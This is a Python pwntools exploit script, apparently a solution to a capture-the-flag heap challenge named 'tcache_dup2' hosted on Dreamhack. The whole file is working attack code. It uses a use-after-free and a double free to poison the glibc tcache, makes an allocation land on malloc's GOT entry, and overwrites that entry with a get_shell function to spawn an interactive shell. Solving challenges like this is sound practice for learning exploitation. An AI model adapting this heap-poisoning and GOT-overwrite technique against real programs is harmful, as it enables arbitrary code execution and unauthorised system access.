#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./tcache_dup2_patched', checksec=False)

libc = ELF("./libc-2.30.so")
ld = ELF("./ld-2.30.so")

gs = """
b *main
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 21195)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

index = 0
def create_heap(size, data):
    global index
    sl(b'1')
    sla(b'Size: ', str(size).encode())
    sla(b'Data: ', data)
    index += 1
    io.recvuntil(b'> ')
    return index - 1

def modify_heap(index, size, data):
    sl(b'2')
    sla(b'idx: ', str(index).encode())
    sla(b'Size: ', str(size).encode())
    sa(b'Data: ', data)
    io.recvuntil(b'> ')

def delete_heap(index):
    sl(b'3')
    sla(b'idx: ', str(index).encode())
    io.recvuntil(b'> ')

io = start()
io.recvuntil(b'> ')

Tcache1 = create_heap(0x28, b'Tcache1')
Tcache2 = create_heap(0x28, b'Tcache3')

delete_heap(Tcache1)
delete_heap(Tcache2)

#UAF
modify_heap(Tcache2, 0xf , b'a' * 9)
#Double FREE
delete_heap(Tcache2)

create_heap(0x28, pack(elf.got['malloc']))
create_heap(0x28, b'garbage')
create_heap(0x28, pack(elf.sym['get_shell']))

io.interactive()